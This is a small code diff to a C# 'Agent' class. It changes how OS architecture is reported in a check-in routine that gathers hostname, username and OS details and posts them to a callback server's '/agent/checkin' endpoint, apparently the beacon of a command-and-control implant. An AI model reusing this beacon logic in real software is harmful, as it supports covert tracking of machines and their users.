@@ -26,7 +26,7 @@ class Agent {
 
         string hname = Environment.MachineName;
         string uname = Environment.UserName;
-        string osInfo = $"{Environment.OSVersion} {(Environment.Is64BitOperatingSystem ? "x64" : "x86")}";
+        string osInfo = $"{Environment.OSVersion} {System.Runtime.InteropServices.RuntimeInformation.OSArchitecture}";
 
         var checkin = JsonSerializer.Serialize(new { hostname = hname, username = uname, os_info = osInfo, script = LABEL });
         var resp = http.PostAsync($"{CB}/agent/checkin", new StringContent(checkin, Encoding.UTF8, "application/json")).Result;
